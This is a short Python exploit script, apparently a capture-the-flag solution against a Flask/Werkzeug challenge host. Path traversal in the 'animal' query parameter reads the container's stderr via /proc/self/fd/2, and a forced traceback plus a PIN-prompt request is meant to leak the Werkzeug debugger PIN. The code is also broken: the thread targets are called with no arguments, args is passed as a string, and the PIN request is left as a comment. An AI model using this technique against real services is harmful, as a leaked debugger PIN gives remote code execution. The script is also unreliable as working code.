import hashlib
from itertools import chain
import requests
import threading
import time

"""
The challenge was running on a docker container, and docker will print stderr output to /proc/self/fd/2 
(stdout goes to /proc/self/fd/1). We can read from stderr by traversing to /proc/self/fd/2, then trigger
an error to get a traceback, then send a request to get the pin prompt, which will write the pin to 
stderr.
""" 

STDERR = "http://chal.b01lers.com:5000/?animal=%2F..%2F..%2Fproc/self/fd/2"

TRACEBACK = "http://chal.b01lers.com:5000/?animal=literalgarbage"

def makeReqThreadWorker(url):
    print(threading.currentThread().getName() + ' : Starting')
    r = requests.get(url)
    for line in r.text.splitlines():
        if line.startswith("<blockquote>"):
            return(line)


def initTraceback(url):
    print(threading.currentThread().getName() + ' : Starting')
    r = requests.get(url)
    # give enough time to start the stderr thread lol
    time.sleep(5)
    # init pin prompt request, which should print pin to stderr



#traceback thread
tr = threading.Thread(name="GETting werkzeug debugger", target=initTraceback(), args = TRACEBACK)


#stderr thread
st = threading.Thread(name="reading from stderr", target=makeReqThreadWorker(), args = STDERR)


tr.start()
st.start()
